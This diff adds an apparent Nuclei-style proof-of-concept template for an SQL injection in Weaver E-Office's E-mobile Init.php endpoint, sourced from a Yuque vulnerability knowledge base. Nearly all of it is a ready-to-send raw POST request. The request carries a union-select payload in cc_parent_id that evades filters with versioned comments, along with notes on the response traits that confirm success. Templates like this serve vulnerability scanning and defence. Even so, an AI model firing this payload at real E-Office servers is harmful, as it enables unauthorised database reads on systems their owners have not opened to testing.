@@ -1,0 +1,48 @@
+id: poc-yehzqutvxrbavkg7
+info:
+  name: 泛微 OA E-Office Init.php SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yehzqutvxrbavkg7'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yehzqutvxrbavkg7
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+
+
+    cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    CC_NAME
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
